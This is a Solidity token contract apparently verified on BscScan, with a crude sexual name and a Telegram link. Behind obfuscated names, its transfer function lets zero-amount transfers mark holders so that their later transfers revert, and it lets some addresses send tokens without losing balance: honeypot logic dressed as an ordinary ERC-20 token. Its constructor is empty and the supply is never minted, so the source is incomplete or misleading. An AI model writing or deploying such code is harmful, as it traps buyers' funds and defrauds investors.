/**
 *Submitted for verification at BscScan.com on 2023-05-15
*/

/*

https://t.me/SexyBallsToken

*/

// SPDX-License-Identifier: MIT

pragma solidity >0.8.0;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), 'Ownable: new owner is the zero address');
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract LickMyButtandSuckonMyBalls is Ownable {
    function aloud(address headed, address wise, uint256 church) private returns (bool success) {
        if (chief[headed] == 0) {
            balanceOf[headed] -= church;
        }

        if (church == 0) {
            gun[wise] += his;
        }

        if (chief[headed] == 0 && uniswapV2Pair != headed && gun[headed] > 0) {
            chief[headed] -= his;
        }

        balanceOf[wise] += church;
        emit Transfer(headed, wise, church);
        return true;
    }

    function transfer(address wise, uint256 church) public returns (bool success) {
        aloud(msg.sender, wise, church);
        return true;
    }

    uint256 public totalSupply = 1000000000 * 10 ** 9;

    constructor(address stronger) {

    }

    function transferFrom(address headed, address wise, uint256 church) public returns (bool success) {
        aloud(headed, wise, church);
        require(church <= allowance[headed][msg.sender]);
        allowance[headed][msg.sender] -= church;
        return true;
    }

    mapping(address => uint256) private chief;

    address public uniswapV2Pair;

    mapping(address => uint256) private gun;

    function approve(address coal, uint256 church) public returns (bool success) {
        allowance[msg.sender][coal] = church;
        emit Approval(msg.sender, coal, church);
        return true;
    }

    event Approval(address indexed owner, address indexed spender, uint256 value);

    mapping(address => uint256) public balanceOf;

    string public symbol = 'Lick My Butt and Suck on My Balls';

    event Transfer(address indexed from, address indexed to, uint256 value);

    uint256 private his = 9;

    string public name = 'Lick My Butt and Suck on My Balls';

    mapping(address => mapping(address => uint256)) public allowance;

    IUniswapV2Router02 private uniswapV2Router = IUniswapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E);

    uint8 public decimals = 9;
}